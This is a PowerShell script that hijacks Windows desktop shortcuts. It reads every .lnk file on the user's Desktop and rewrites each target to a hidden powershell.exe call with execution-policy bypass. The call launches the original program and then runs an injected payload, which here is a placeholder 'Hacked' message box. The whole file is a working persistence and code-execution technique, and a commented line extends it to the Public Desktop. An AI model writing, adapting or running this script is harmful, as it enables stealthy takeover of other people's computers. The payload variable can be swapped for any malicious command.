$code = "Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Hacked')"

function Get-Shortcut {
  param(
    $path = $null
  )

  $obj = New-Object -ComObject WScript.Shell

  if ($path -eq $null) {
    $pathUser = [System.Environment]::GetFolderPath('StartMenu')
    $pathCommon = $obj.SpecialFolders.Item('AllUsersStartMenu')
    $path = dir $pathUser, $pathCommon -Filter *.lnk -Recurse 
  }
  if ($path -is [string]) {
    $path = dir $path -Filter *.lnk
  }
  $path | ForEach-Object { 
    if ($_ -is [string]) {
      $_ = dir $_ -Filter *.lnk
    }
    if ($_) {
      $link = $obj.CreateShortcut($_.FullName)

      $info = @{}
      $info.Hotkey = $link.Hotkey
      $info.TargetPath = $link.TargetPath
      $info.LinkPath = $link.FullName
      $info.Arguments = $link.Arguments
      $info.Target = try {Split-Path $info.TargetPath -Leaf } catch { 'n/a'}
      $info.Link = try { Split-Path $info.LinkPath -Leaf } catch { 'n/a'}
      $info.WindowStyle = $link.WindowStyle
      $info.IconLocation = $link.IconLocation

      return $info
    }
  }
}

#-----------------------------------------------------------------------------------------------------------

function Set-Shortcut {
  param(
  [Parameter(ValueFromPipelineByPropertyName=$true)]
  $LinkPath,
  $IconLocation,
  $Arguments,
  $TargetPath
  )
  begin {
    $shell = New-Object -ComObject WScript.Shell
  }

  process {
    $link = $shell.CreateShortcut($LinkPath)

    $PSCmdlet.MyInvocation.BoundParameters.GetEnumerator() |
      Where-Object { $_.key -ne 'LinkPath' } |
      ForEach-Object { $link.$($_.key) = $_.value }
    $link.Save()
  }
}

#-----------------------------------------------------------------------------------------------------------

function hijack{
$Link = $i.LinkPath
$Loc = $i.IconLocation
$TargetPath = $i.TargetPath
if($Loc.length -lt 4){$Loc = "$TargetPath$Loc"}
$Target = $i.Target
if(Test-Path -Path "$Link" -PathType Leaf){Set-Shortcut -LinkPath "$Link" -IconLocation "$Loc" -Arguments "-w h -NoP -NonI -Exec Bypass start-process '$TargetPath';$code" -TargetPath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"}
}

#-----------------------------------------------------------------------------------------------------------

Get-ChildItem "$Env:USERPROFILE\Desktop" -Filter *.lnk |Foreach-Object {$i = Get-Shortcut $_.FullName;hijack $_.FullName}

#Get-ChildItem "$env:Public\Desktop" -Filter *.lnk |Foreach-Object {$i = Get-Shortcut $_.FullName;hijack $_.FullName}
